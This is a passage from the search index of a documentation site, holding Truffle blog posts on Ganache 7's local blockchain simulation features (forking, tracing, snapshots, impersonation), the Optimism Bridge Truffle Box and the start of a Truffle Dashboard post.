{}; const server = ganache . server ( options ); const PORT = 8545 ; server . listen ( PORT , err => { if ( err ) throw err ; console . log ( `ganache listening on port ${ PORT } ...` ); const provider = server . provider ; const accounts = await provider . request ({ method : \"eth_accounts\" , params : [] }); }); ... As a Web3.js provider const Web3 = require ( \"web3\" ); const ganache = require ( \"ganache\" ); const web3 = new Web3 ( ganache . provider ()); ... As an Ethers.js provider const ganache = require ( \"ganache\" ); const provider = new ethers . providers . Web3Provider ( ganache . provider ()); C. Using Ganache 7 in the browser. \u00b6 You can use Ganache 7 in the browser by adding the following script tag to your HTML code: < script src = \"https://cdn.jsdelivr.net/npm/ganache@7.0.0/dist/web/ganache.min.js\" >< /script> By doing that, Ganache 7 is automatically available in your browser for use: const options = {}; const provider = Ganache . provider ( options ); Again, see here for a list of available options you can pass in. New Ganache 7 Features \u00b6 1. Zero-config mainnet forking \u00b6 Ganache supports mainnet forking out of the box without any configuration, allowing you to simulate having the same state as the Ethereum mainnet, but on your local machine. This opens up many possibilities; for example, you can interact with a real-world protocol/contract locally during development, step through, and debug main net transactions locally (using truffle debug ), allowing visibility to details about your contract. Here's a 2016 demo of the Ganache team using the Mainnet forking feature to exploit the DAO hack . To use this feature, start Ganache 7 using the ganache --fork command. Ganache uses Infura as its provider under the hood by default, but you can also specify a provider by passing a URL; for example, you can use your own Infura URL by running this command: $ ganache --fork.url wss://mainnet.infura.io/ws/v3/<PROJECT ID> Ganache fetches five blocks back from the latest by default to avoid missing blocks due to reordering. This is a configurable behavior; you can either specify the exact block you want to fork from using --fork.blockNumber <BLOCK NUMBER> or by setting --fork.preLatestConfirmations 0 . 2. Fork any Ethereum test network without waiting for sync time \u00b6 In addition to being able to fork the Ethereum main network with zero configuration, Ganache also allows you to fork from any Ethereum test network, including Ropsten, Kovan, Rinkeby, and G\u00f6rli. You can do that by running the fork command with the network option: ganache -- fork.network <NETWORK NAME> . Cool, yeah? Here's what forking from the Rinkeby testnet looks like: 3. Support for massive transaction traces (over 10GB+) \u00b6 Ganache supports massive transaction tracing using the debug_traceTransaction RPC method. To use this feature, start Ganache by forking off of Mainnet (or any test network) at a block number greater than that of the transaction you're trying to trace; for example, if you want to trace a transaction inside block 13,886,877, you will need to start Ganache at block number 13,886,878: $ ganache --fork.network mainnet --fork.blockNumber <blockNumber> Then send a curl request using the debug_traceTransaction method specifying the transaction hash like so: $ curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"debug_traceTransaction\", \"params\": [ \"<TRANSACTION HASH>\" ] }' http://localhost:8545 This would return the aggregated summary of this transaction for post-processing. Try it with a large transaction like 0x8bb8dc5c7c830bac85fa48acad2505e9300a91c3ff239c9517d0cae33b595090 (Warp Finance hack): First, start ganache (with lots of extra memory): $ NODE_OPTIONS = --max-old-space-size = 16384 ganache --fork --fork.blockNumber 14037983 then execute debug_traceTransaction and send the output to trace.json: $ curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"debug_traceTransaction\", \"params\": [ \"0x8bb8dc5c7c830bac85fa48acad2505e9300a91c3ff239c9517d0cae33b595090\" ] }' http://localhost:8545 -o trace.json If you really want to test the limits of what's possible (and have a lot of time - about 1-2 hours) try out the 10GB+ Cream Finance hack transaction, 0x0fe2542079644e107cbf13690eb9c2c65963ccb79089ff96bfaf8dced2331c92 ! 4. Snapshot and Revert state \u00b6 In blockchain terms, a snapshot refers to the act of capturing and recording the state of a blockchain at a particular block number. A snapshot is the complete view of the blockchain in that specific block and includes all existing addresses and their associated data, including transactions, fees, balance, metadata, etc. In Ganache, you can take a snapshot of your development blockchain (or even a fork of Mainnet) using the evm_snapshot RPC method; it takes no parameters and returns an ID of the snapshot that it creates. Ganache also supports reverting state to a previously taken snapshot using the evm_revert RPC method, although once a revert is invoked and succeeds, you can no longer use the snapshot with the corresponding ID as you can only revert a snapshot once. You should consider creating a new snapshot after every evm_revert if you need to revert to the same point multiple times; here's a demo of taking a snapshot and reverting state in Ganache: const provider = ganache . provider (); const [ from , to ] = await provider . send ( \"eth_accounts\" ); const startingBalance = BigInt ( await provider . send ( \"eth_getBalance\" , [ from ] )); // take a snapshot const snapshotId = await provider . send ( \"evm_snapshot\" ); // send value to another account (over-simplified example) await provider . send ( \"eth_subscribe\" , [ \"newHeads\" ] ); await provider . send ( \"eth_sendTransaction\" , [{ from , to , value : \"0xffff\" }] ); await provider . once ( \"message\" ); // Note: `await provider.once` is non-standard // ensure balance has updated const newBalance = await provider . send ( \"eth_getBalance\" , [ from ] ); assert ( BigInt ( newBalance ) < startingBalance ); // revert the snapshot const isReverted = await provider . send ( \"evm_revert\" , [ snapshotId ] ); assert ( isReverted ); // ensure balance has reverted const endingBalance = await provider . send ( \"eth_getBalance\" , [ from ] ); const isBalanceReverted = assert . strictEqual ( BigInt ( endingBalance ), startingBalance ); console . log ({ isBalanceReverted : isBalanceReverted }); 5. Mine blocks instantly, at interval, or on demand \u00b6 Ganache allows you to configure how you want blocks to be mined during development; by default, blocks will be mined immediately upon receiving a transaction, but you can choose between the following options: At interval : You can specify the time in seconds Ganache should wait before mining the next transaction by passing the --miner.blockTime <TIME IN SECONDS> option. A block time of 0 means Ganache should mine new transactions instantly. On demand : Ganache also exposes an evm_mine RPC method which forces a single block to be mined whether mining is running or stopped. This will mine an empty block if no transaction exists in the mempool. See code sample below: console . log ( \"start\" , await provider . send ( \"eth_blockNumber\" )); await provider . send ( \"evm_mine\" , [{ blocks : 5 }] ); // mines 5 blocks console . log ( \"end\" , await provider . send ( \"eth_blockNumber\" )); 6. Fast forward time \u00b6 Ganache exposes two RPC methods for manipulating time on your development blockchain. A typical use case would be a smart contract that requires that a specific time passes before users can take certain actions; if the set time isn't something you want to wait for, you can use the evm_increaseTime to increase the blockchain current timestamp by the specified amount of time in seconds (passed in as hexadecimal). curl -H 'Content-Type: application/json' --data' {\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"evm_increaseTime\", \"params\": [\"0x15180\"] }' http://localhost:8545 This returns the total time adjusted in milliseconds. Furthermore, you can use the evm_setTime to set it to a specific timestamp; it accepts a JavaScript timestamp (Unix epoch) with millisecond precision and returns the number of seconds between the given timestamp and the current time. curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"evm_increaseTime\", \"params\": [\"0x15180\"] }' http://localhost:8545 You should use this method cautiously as it allows you to move backwards in time, which may cause new blocks to appear to be mined before older blocks, thereby invalidating the blockchain state. 7. Impersonate any account \u00b6 Ganache allows you to impersonate another account during development. This is more interesting when used with the fork feature; you can fork Mainnet and impersonate any account. Here's an example of how you can fork Mainnet, impersonate an account, and send some tokens to another account. Start Ganache by forking Mainnet and impersonating (unlocking) a random account: ganache --fork --wallet.unlockedAccounts <Account Address Here> Get the balance of the unlocked account: curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"eth_getBalance\", \"params\": [\"<Account Address Here>\"] }' http://localhost:8545 . This returns the balance in WEI encoded as a hex number. Send some ether from the unlocked account to another account: curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"eth_sendTransaction\", \"params\": [{\"from\": \"UNLOCKED ACCOUNT\", \"to\": \"RECEIVING ACCOUNT\", \"value\": \"AMOUNT TO SEND\"}] }' http://localhost:8545 Now verify that the unlocked account's balance has been reduced by the number of Ether sent out. Sending Ether to another account isn't the only use case as you can impersonate an account to call certain owner-only functions in a smart contract as we did in the convex benchmark contract we saw earlier. 8. Pending transactions \u00b6 In Ethereum, every transaction has a nonce. The nonce is the number of transactions sent from a given address to date, and anytime you send a transaction, the nonce increases by 1. For a transaction to be mined, it has to have a nonce greater than that of the previous transaction by 1. In earlier versions of Ganache, if you send a transaction with a nonce greater than the last nonce by more than 1, Ganache would error, and the transaction would be rejected. With Ganache 7, if the nonce of the previous transaction is 1, and you send a transaction with the nonce set to 3 for whatever reason, this transaction with nonce 3 will sit in the transaction pool until a transaction with nonce 2 is sent, at which time both transactions will be mined and added to the blockchain state. Start using Ganache 7 today by simply running npm install ganache --global && ganache --help , or view the v7 Release Notes . This release has been years in the making and we're really proud of the work we've done. We hope you love it as much as we do. Thank you to everyone who has been a part of making this release happen\u2009\u2014\u2009contributors, mentors, reviewers, issue reporters, and community participators have all been instrumental in making Ganache v7. We are immensely thankful to you all. \ud83d\udc96 The Truffle Team", "title": "Ganache 7 Ethereum Simulator - Building on Web3 is now easier and faster than ever before"}, {"location": "blog/introducing-ganache-7/#ganache-7-30x-faster-forking-and-operations", "text": "Many Web3 developers building on Ethereum already use Ganache to fork and test smart contracts in their local environments for confidence before deployment. Armed with the knowledge gained from previous iterations, we rewrote Ganache from the ground up with the mission to make the blockchain simulator tool even more flexible, faster, and more stable. We heard your feedback that Ganache v6 was slow to install, slow to run, and leaked memory. It also didn\u2019t use the modern language features and paradigms developers use today, like TypeScript types and the Promise abstraction. Ganache v6\u2019s architecture made testing, fixing bugs, and adding features difficult and time-consuming. How is Ganache v7 better? With advanced caching capabilities on the latest version, Ganache's forking feature is up to 30 times faster than v6. Zero-config Mainnet forking! Ganache v7 has a native integration with Infura which enables free access to historical data You can run Ganache indefinitely without running into crashes due to memory issues Common operations are about 3 times faster than v6.", "title": "Ganache 7: 30x faster forking and operations"}, {"location": "blog/introducing-ganache-7/#installing-and-setting-up-ganache-7", "text": "Ganache can be used in many ways, including as a command-line tool, programmatically via Node.js, or in the browser. See the instructions below for installing and using Ganache 7 for all these use cases.", "title": "Installing and Setting up Ganache 7"}, {"location": "blog/introducing-ganache-7/#a-using-ganache-7-on-the-command-line", "text": "To run Ganache 7 on the command line, you must have Node.js >= v12.0.0 and NPM >= 6.4.1 installed on your computer. See here to download the latest version for your operating system, or use nvm to manage your Node installation for Unix or Windows . With Node.js and NPM installed, you can install Ganache 7 globally by running npm install ganache --global . Once installed, you can run ganache from anywhere in your command line. Your terminal should look like this: By default, Ganache provides 10 test accounts, each with 1000 (fake) Ether along with the corresponding private keys and the mnemonic phrase used to generate them. You can use this phrase to import the accounts into wallets like MetaMask during development. We can override all defaults by specifying options when starting Ganache 7; for example, we can have more control over account creation by providing a mapping of private keys to account balances like so: ganache --wallet.accounts \"0xfd485338e322f5930f7cf475f385341ec88bfc4f8a0a16f30b2fb417d1bb5427, 1000000000000000000000\" \"0x05bba0b9f7a251080aa23feee4eab3f75a1abee905c0271008c93e5d2e2e7541, 10000000000000000000000\" We can also specify a mnemonic phrase to derive all initial accounts from, a miner gas price, and the block gas limit. For example: ganache --miner.defaultGasPrice 200 --miner.blockGasLimit 90071 --miner.callGasLimit 898989 --wallet.mnemonic \"alarm cause brave super lab glide awake hunt rose win sugar idea\" Run the command ganache --help for a list of all the available options you can pass to Ganache. We can also install ganache into a local Node.js project using npm install ganache without the --global flag, then add it to your project\u2019s package.json scripts , e.g., \"scripts\": {\"ganache\": \"ganache --mnemonic <12 words mnemonic>\"} .", "title": "A. Using Ganache 7 On the command line"}, {"location": "blog/introducing-ganache-7/#b-using-ganache-7-programmatically", "text": "Ganache 7 can be used programmatically in your Node.js project as: A standalone EIP-1193 provider, A JSON-RPC server and EIP-1193 provider, A web3.js provider and An ethers.js provider. See code samples for these different use cases below. To begin, install Ganache 7 as npm package in your Node.js project $ npm install ganache As a standalone EIP-1193 provider const ganache = require ( \"ganache\" ); const options = {}; const provider = ganache . provider ( options ); const accounts = await provider . request ({ method : \"eth_accounts\" , params : [] }); ... As a JSON-RPC web server and an EIP-1193 provider const ganache = require ( \"ganache\" ); const options = {}; const server = ganache . server ( options ); const PORT = 8545 ; server . listen ( PORT , err => { if ( err ) throw err ; console . log ( `ganache listening on port ${ PORT } ...` ); const provider = server . provider ; const accounts = await provider . request ({ method : \"eth_accounts\" , params : [] }); }); ... As a Web3.js provider const Web3 = require ( \"web3\" ); const ganache = require ( \"ganache\" ); const web3 = new Web3 ( ganache . provider ()); ... As an Ethers.js provider const ganache = require ( \"ganache\" ); const provider = new ethers . providers . Web3Provider ( ganache . provider ());", "title": "B. Using Ganache 7 programmatically"}, {"location": "blog/introducing-ganache-7/#c-using-ganache-7-in-the-browser", "text": "You can use Ganache 7 in the browser by adding the following script tag to your HTML code: < script src = \"https://cdn.jsdelivr.net/npm/ganache@7.0.0/dist/web/ganache.min.js\" >< /script> By doing that, Ganache 7 is automatically available in your browser for use: const options = {}; const provider = Ganache . provider ( options ); Again, see here for a list of available options you can pass in.", "title": "C. Using Ganache 7 in the browser."}, {"location": "blog/introducing-ganache-7/#new-ganache-7-features", "text": "", "title": "New Ganache 7 Features"}, {"location": "blog/introducing-ganache-7/#1-zero-config-mainnet-forking", "text": "Ganache supports mainnet forking out of the box without any configuration, allowing you to simulate having the same state as the Ethereum mainnet, but on your local machine. This opens up many possibilities; for example, you can interact with a real-world protocol/contract locally during development, step through, and debug main net transactions locally (using truffle debug ), allowing visibility to details about your contract. Here's a 2016 demo of the Ganache team using the Mainnet forking feature to exploit the DAO hack . To use this feature, start Ganache 7 using the ganache --fork command. Ganache uses Infura as its provider under the hood by default, but you can also specify a provider by passing a URL; for example, you can use your own Infura URL by running this command: $ ganache --fork.url wss://mainnet.infura.io/ws/v3/<PROJECT ID> Ganache fetches five blocks back from the latest by default to avoid missing blocks due to reordering. This is a configurable behavior; you can either specify the exact block you want to fork from using --fork.blockNumber <BLOCK NUMBER> or by setting --fork.preLatestConfirmations 0 .", "title": "1. Zero-config mainnet forking"}, {"location": "blog/introducing-ganache-7/#2-fork-any-ethereum-test-network-without-waiting-for-sync-time", "text": "In addition to being able to fork the Ethereum main network with zero configuration, Ganache also allows you to fork from any Ethereum test network, including Ropsten, Kovan, Rinkeby, and G\u00f6rli. You can do that by running the fork command with the network option: ganache -- fork.network <NETWORK NAME> . Cool, yeah? Here's what forking from the Rinkeby testnet looks like:", "title": "2. Fork any Ethereum test network without waiting for sync time"}, {"location": "blog/introducing-ganache-7/#3-support-for-massive-transaction-traces-over-10gb", "text": "Ganache supports massive transaction tracing using the debug_traceTransaction RPC method. To use this feature, start Ganache by forking off of Mainnet (or any test network) at a block number greater than that of the transaction you're trying to trace; for example, if you want to trace a transaction inside block 13,886,877, you will need to start Ganache at block number 13,886,878: $ ganache --fork.network mainnet --fork.blockNumber <blockNumber> Then send a curl request using the debug_traceTransaction method specifying the transaction hash like so: $ curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"debug_traceTransaction\", \"params\": [ \"<TRANSACTION HASH>\" ] }' http://localhost:8545 This would return the aggregated summary of this transaction for post-processing. Try it with a large transaction like 0x8bb8dc5c7c830bac85fa48acad2505e9300a91c3ff239c9517d0cae33b595090 (Warp Finance hack): First, start ganache (with lots of extra memory): $ NODE_OPTIONS = --max-old-space-size = 16384 ganache --fork --fork.blockNumber 14037983 then execute debug_traceTransaction and send the output to trace.json: $ curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"debug_traceTransaction\", \"params\": [ \"0x8bb8dc5c7c830bac85fa48acad2505e9300a91c3ff239c9517d0cae33b595090\" ] }' http://localhost:8545 -o trace.json If you really want to test the limits of what's possible (and have a lot of time - about 1-2 hours) try out the 10GB+ Cream Finance hack transaction, 0x0fe2542079644e107cbf13690eb9c2c65963ccb79089ff96bfaf8dced2331c92 !", "title": "3. Support for massive transaction traces (over 10GB+)"}, {"location": "blog/introducing-ganache-7/#4-snapshot-and-revert-state", "text": "In blockchain terms, a snapshot refers to the act of capturing and recording the state of a blockchain at a particular block number. A snapshot is the complete view of the blockchain in that specific block and includes all existing addresses and their associated data, including transactions, fees, balance, metadata, etc. In Ganache, you can take a snapshot of your development blockchain (or even a fork of Mainnet) using the evm_snapshot RPC method; it takes no parameters and returns an ID of the snapshot that it creates. Ganache also supports reverting state to a previously taken snapshot using the evm_revert RPC method, although once a revert is invoked and succeeds, you can no longer use the snapshot with the corresponding ID as you can only revert a snapshot once. You should consider creating a new snapshot after every evm_revert if you need to revert to the same point multiple times; here's a demo of taking a snapshot and reverting state in Ganache: const provider = ganache . provider (); const [ from , to ] = await provider . send ( \"eth_accounts\" ); const startingBalance = BigInt ( await provider . send ( \"eth_getBalance\" , [ from ] )); // take a snapshot const snapshotId = await provider . send ( \"evm_snapshot\" ); // send value to another account (over-simplified example) await provider . send ( \"eth_subscribe\" , [ \"newHeads\" ] ); await provider . send ( \"eth_sendTransaction\" , [{ from , to , value : \"0xffff\" }] ); await provider . once ( \"message\" ); // Note: `await provider.once` is non-standard // ensure balance has updated const newBalance = await provider . send ( \"eth_getBalance\" , [ from ] ); assert ( BigInt ( newBalance ) < startingBalance ); // revert the snapshot const isReverted = await provider . send ( \"evm_revert\" , [ snapshotId ] ); assert ( isReverted ); // ensure balance has reverted const endingBalance = await provider . send ( \"eth_getBalance\" , [ from ] ); const isBalanceReverted = assert . strictEqual ( BigInt ( endingBalance ), startingBalance ); console . log ({ isBalanceReverted : isBalanceReverted });", "title": "4. Snapshot and Revert state"}, {"location": "blog/introducing-ganache-7/#5-mine-blocks-instantly-at-interval-or-on-demand", "text": "Ganache allows you to configure how you want blocks to be mined during development; by default, blocks will be mined immediately upon receiving a transaction, but you can choose between the following options: At interval : You can specify the time in seconds Ganache should wait before mining the next transaction by passing the --miner.blockTime <TIME IN SECONDS> option. A block time of 0 means Ganache should mine new transactions instantly. On demand : Ganache also exposes an evm_mine RPC method which forces a single block to be mined whether mining is running or stopped. This will mine an empty block if no transaction exists in the mempool. See code sample below: console . log ( \"start\" , await provider . send ( \"eth_blockNumber\" )); await provider . send ( \"evm_mine\" , [{ blocks : 5 }] ); // mines 5 blocks console . log ( \"end\" , await provider . send ( \"eth_blockNumber\" ));", "title": "5. Mine blocks instantly, at interval, or on demand"}, {"location": "blog/introducing-ganache-7/#6-fast-forward-time", "text": "Ganache exposes two RPC methods for manipulating time on your development blockchain. A typical use case would be a smart contract that requires that a specific time passes before users can take certain actions; if the set time isn't something you want to wait for, you can use the evm_increaseTime to increase the blockchain current timestamp by the specified amount of time in seconds (passed in as hexadecimal). curl -H 'Content-Type: application/json' --data' {\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"evm_increaseTime\", \"params\": [\"0x15180\"] }' http://localhost:8545 This returns the total time adjusted in milliseconds. Furthermore, you can use the evm_setTime to set it to a specific timestamp; it accepts a JavaScript timestamp (Unix epoch) with millisecond precision and returns the number of seconds between the given timestamp and the current time. curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"evm_increaseTime\", \"params\": [\"0x15180\"] }' http://localhost:8545 You should use this method cautiously as it allows you to move backwards in time, which may cause new blocks to appear to be mined before older blocks, thereby invalidating the blockchain state.", "title": "6. Fast forward time"}, {"location": "blog/introducing-ganache-7/#7-impersonate-any-account", "text": "Ganache allows you to impersonate another account during development. This is more interesting when used with the fork feature; you can fork Mainnet and impersonate any account. Here's an example of how you can fork Mainnet, impersonate an account, and send some tokens to another account. Start Ganache by forking Mainnet and impersonating (unlocking) a random account: ganache --fork --wallet.unlockedAccounts <Account Address Here> Get the balance of the unlocked account: curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"eth_getBalance\", \"params\": [\"<Account Address Here>\"] }' http://localhost:8545 . This returns the balance in WEI encoded as a hex number. Send some ether from the unlocked account to another account: curl -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"eth_sendTransaction\", \"params\": [{\"from\": \"UNLOCKED ACCOUNT\", \"to\": \"RECEIVING ACCOUNT\", \"value\": \"AMOUNT TO SEND\"}] }' http://localhost:8545 Now verify that the unlocked account's balance has been reduced by the number of Ether sent out. Sending Ether to another account isn't the only use case as you can impersonate an account to call certain owner-only functions in a smart contract as we did in the convex benchmark contract we saw earlier.", "title": "7. Impersonate any account"}, {"location": "blog/introducing-ganache-7/#8-pending-transactions", "text": "In Ethereum, every transaction has a nonce. The nonce is the number of transactions sent from a given address to date, and anytime you send a transaction, the nonce increases by 1. For a transaction to be mined, it has to have a nonce greater than that of the previous transaction by 1. In earlier versions of Ganache, if you send a transaction with a nonce greater than the last nonce by more than 1, Ganache would error, and the transaction would be rejected. With Ganache 7, if the nonce of the previous transaction is 1, and you send a transaction with the nonce set to 3 for whatever reason, this transaction with nonce 3 will sit in the transaction pool until a transaction with nonce 2 is sent, at which time both transactions will be mined and added to the blockchain state. Start using Ganache 7 today by simply running npm install ganache --global && ganache --help , or view the v7 Release Notes . This release has been years in the making and we're really proud of the work we've done. We hope you love it as much as we do. Thank you to everyone who has been a part of making this release happen\u2009\u2014\u2009contributors, mentors, reviewers, issue reporters, and community participators have all been instrumental in making Ganache v7. We are immensely thankful to you all. \ud83d\udc96 The Truffle Team", "title": "8. Pending transactions"}, {"location": "blog/introducing-the-optimism-bridge-truffle-box/", "text": "By Kingsley Arinze The growth of the crypto ecosystem has led to the introduction of multiple Layer 1 (L1) blockchains and Layer 2 (L2) scaling solutions, leading blockchain enthusiasts to believe that the future is multi-chain. However, the full potential of a multi-chain future can only be realized when there is a means of data exchange between the various L1s and L2s. What are bridges \u00b6 Imagine a scenario where all of a user's assets live on the Ethereum Mainnet. This user stumbles upon a new dapp that offers new exciting features, but only exists on a L2 such as Optimism. For this user to be able to transfer their existing assets from Mainnet to Optimism, there needs to be a solution that connects the two networks. Bridges are that solution. Blockchain bridges are solutions that allow for the easy transfer of assets and information between various L1s and L2s. With all the different blockchains that exist today, each with different underlying technologies and consensus mechanisms, the need for blockchain bridges can not be overstated. The benefits of blockchain bridges include: Easy exchange of data between two blockchain networks More options for users as they explore dapps on other networks Collaboration between developers across ecosystems What are Truffle boxes \u00b6 Truffle Boxes are the easiest way to get started building dapps on Ethereum or other L1s and L2s. They are helpful boilerplate code that provides the necessary configuration needed to build, deploy, and test a dapp, allowing developers to focus on the most important part of their dapp: the application logic. Truffle boxes come bundled with useful libraries, solidity contracts, and frontend code out of the box. They are built in a non-opinionated way so that developers are not locked into building a certain type of dapp. Truffle currently has 50+ boxes ready for use, and you can find out more about them here . The Optimism Bridge Box \u00b6 The Truffle Optimism Bridge Box provides you with the setup necessary to start building applications between multiple Ethereum network layers. It contains contracts that interact with the Optimism bridge on L1 and L2, along with a set of migrations for deploying contracts, calling functions, and passing messages and values. Past L2 Truffle Boxes for Optimism and Arbitrium were built without support for bridging in mind. In this new iteration of Truffle Boxes, we\u2019re focusing on demonstrating bridging support for popular L2 networks. Requirements and Installation \u00b6 As with every Truffle Box, you need to fulfill the following requirements before you can use them: Node.js 10.x or later NPM 5.2 or later Docker 19.03.12 or later Docker-compose version 1.27.3 or later Recommended Docker memory allocation of >= 8 GB Windows, Linux, or macOS Other important, but optional requirements are: An Infura account and a Project ID A MetaMask account Then, you can install this box by simply running the command: truffle unbox optimism-bridge It is important to note that this command will only work after the box has been published and gone live. You can use the following command to access it in the interim. truffle unbox https://github.com/truffle-box/optimism-box Setting up the Optimism Bridge Box \u00b6 With the Optimism Bridge Box installed, the next step is to install all the dependencies bundled with the box. To do that, navigate to the root directory of the box and run the command yarn install . Next, you will need to set up some environment variables. The Optimism Bridge Box comes with a .env.example file which can be found in the root directory and contains all the required environment variables that need to be set. Copy those over into a new .env file you will create and provide the necessary values. You will need to provide at least one mnemonic to use with the network. For more information about setting up and the required environment variables, please refer to the documentation here . Start bridging! \u00b6 Now that you have installed and configured the Optimism Bridge Box, it\u2019s time to start bridging! To help get started, we\u2019ve included the following contracts and scripts as examples: An L1 contract that sends a message over the Optimism bridge. A Migration that sends a message from Ethereum to Optimism. An L2 contract that sends a message over the Optimism bridge. A Migration that sends a message from Optimism to Ethereum. A script to automate the process of compiling contracts, running migrations, and sending messages across each side of the bridge. A script to automate the process of sending ETH and DAI across each side of the bridge. Conclusion \u00b6 That\u2019s all you need to get started building dapps that bridge between Optimism and Ethereum. We\u2019ve put together a short demo that further expands on how the Optimism Bridge Box can be used to bridge networks. We\u2019re so excited to see what our developer community builds with this these tools! To find out more about our suite of developer tools, visit the official Truffle website . If you have questions that you'd like for our team members to answer, feel free to start a discussion on Github Discussions . Finally, don't forget to follow us on Twitter for live announcements and updates.", "title": "Introducing the Optimism bridge Truffle box"}, {"location": "blog/introducing-the-optimism-bridge-truffle-box/#what-are-bridges", "text": "Imagine a scenario where all of a user's assets live on the Ethereum Mainnet. This user stumbles upon a new dapp that offers new exciting features, but only exists on a L2 such as Optimism. For this user to be able to transfer their existing assets from Mainnet to Optimism, there needs to be a solution that connects the two networks. Bridges are that solution. Blockchain bridges are solutions that allow for the easy transfer of assets and information between various L1s and L2s. With all the different blockchains that exist today, each with different underlying technologies and consensus mechanisms, the need for blockchain bridges can not be overstated. The benefits of blockchain bridges include: Easy exchange of data between two blockchain networks More options for users as they explore dapps on other networks Collaboration between developers across ecosystems", "title": "What are bridges"}, {"location": "blog/introducing-the-optimism-bridge-truffle-box/#what-are-truffle-boxes", "text": "Truffle Boxes are the easiest way to get started building dapps on Ethereum or other L1s and L2s. They are helpful boilerplate code that provides the necessary configuration needed to build, deploy, and test a dapp, allowing developers to focus on the most important part of their dapp: the application logic. Truffle boxes come bundled with useful libraries, solidity contracts, and frontend code out of the box. They are built in a non-opinionated way so that developers are not locked into building a certain type of dapp. Truffle currently has 50+ boxes ready for use, and you can find out more about them here .", "title": "What are Truffle boxes"}, {"location": "blog/introducing-the-optimism-bridge-truffle-box/#the-optimism-bridge-box", "text": "The Truffle Optimism Bridge Box provides you with the setup necessary to start building applications between multiple Ethereum network layers. It contains contracts that interact with the Optimism bridge on L1 and L2, along with a set of migrations for deploying contracts, calling functions, and passing messages and values. Past L2 Truffle Boxes for Optimism and Arbitrium were built without support for bridging in mind. In this new iteration of Truffle Boxes, we\u2019re focusing on demonstrating bridging support for popular L2 networks.", "title": "The Optimism Bridge Box"}, {"location": "blog/introducing-the-optimism-bridge-truffle-box/#requirements-and-installation", "text": "As with every Truffle Box, you need to fulfill the following requirements before you can use them: Node.js 10.x or later NPM 5.2 or later Docker 19.03.12 or later Docker-compose version 1.27.3 or later Recommended Docker memory allocation of >= 8 GB Windows, Linux, or macOS Other important, but optional requirements are: An Infura account and a Project ID A MetaMask account Then, you can install this box by simply running the command: truffle unbox optimism-bridge It is important to note that this command will only work after the box has been published and gone live. You can use the following command to access it in the interim. truffle unbox https://github.com/truffle-box/optimism-box", "title": "Requirements and Installation"}, {"location": "blog/introducing-the-optimism-bridge-truffle-box/#setting-up-the-optimism-bridge-box", "text": "With the Optimism Bridge Box installed, the next step is to install all the dependencies bundled with the box. To do that, navigate to the root directory of the box and run the command yarn install . Next, you will need to set up some environment variables. The Optimism Bridge Box comes with a .env.example file which can be found in the root directory and contains all the required environment variables that need to be set. Copy those over into a new .env file you will create and provide the necessary values. You will need to provide at least one mnemonic to use with the network. For more information about setting up and the required environment variables, please refer to the documentation here .", "title": "Setting up the Optimism Bridge Box"}, {"location": "blog/introducing-the-optimism-bridge-truffle-box/#start-bridging", "text": "Now that you have installed and configured the Optimism Bridge Box, it\u2019s time to start bridging! To help get started, we\u2019ve included the following contracts and scripts as examples: An L1 contract that sends a message over the Optimism bridge. A Migration that sends a message from Ethereum to Optimism. An L2 contract that sends a message over the Optimism bridge. A Migration that sends a message from Optimism to Ethereum. A script to automate the process of compiling contracts, running migrations, and sending messages across each side of the bridge. A script to automate the process of sending ETH and DAI across each side of the bridge.", "title": "Start bridging!"}, {"location": "blog/introducing-the-optimism-bridge-truffle-box/#conclusion", "text": "That\u2019s all you need to get started building dapps that bridge between Optimism and Ethereum. We\u2019ve put together a short demo that further expands on how the Optimism Bridge Box can be used to bridge networks. We\u2019re so excited to see what our developer community builds with this these tools! To find out more about our suite of developer tools, visit the official Truffle website . If you have questions that you'd like for our team members to answer, feel free to start a discussion on Github Discussions . Finally, don't forget to follow us on Twitter for live announcements and updates.", "title": "Conclusion"}, {"location": "blog/introducing-truffle-dashboard/", "text": "By Kingsley Arinze Don't get rekt \ud83d\ude40 \u00b6 One of our core missions at Truffle is to provide tooling that aids in the complete Web3 dapp development lifecycle, while maintaining rigorous security practices throughout. As a smart contract developer, you require your development tools to keep your sensitive information secret and safe. At Truffle, we're always looking for ways to make your experience more secure. If you\u2019ve ever deployed a smart contract, chances are you\u2019ve had to think twice about sharing your private keys with Truffle or other development tools. Maybe you've had to be vigilant not to accidentally share those keys on GitHub. To deploy to an Ethereum network, you've needed to copy your wallet credentials and store them in an insecure location to share with a tool like HDWalletProvider. This has been necessary because your mnemonic or private key gives Truffle the permissions it needs to sign transactions on your behalf. Have you ever had to do something like this? Storing your mnemonic seed phrase or private keys in regular files poses a considerable security concern. Your seed phrase can easily be hijacked by JavaScript code, accidentally committed to Git, or targeted by bad actors. Enter Truffle Dashboard \ud83d\udd25 \ud83d\ude80 \u00b6 Truffle Dashboard completely removes the need to manually interact with your wallet's mnemonic phrase or private keys throughout the development lifecycle. You can now safely deploy your smart contracts to your network of choice without Truffle ever needing to know what your keys look like. Truffle seamlessly connects to your MetaMask wallet without any configuration, using the currently selected account and network for Truffle's deployment configuration. But that's not all! For your convenience, you can use Truffle Dashboard with any development tool. For example, if you use Hardhat or Foundry to develop your smart contracts, you can also integrate with Truffle Dashboard for this improved security workflow. See the Using Truffle Dashboard with other development tools section of our docs to learn how. How does Truffle Dashboard Work? \u2699\ufe0f\ud83d\udd27 \u00b6 If you're new to Truffle, ensure you have Node.js then install the latest version of Truffle with the following command: npm install -g truffle If you already have Truffle installed, you want to first uninstall your existing instance of Truffle globally: npm uninstall -g truffle npm install -g truffle Running Truffle Dashboard \ud83d\ude80 \u00b6 With the latest version of Truffle, 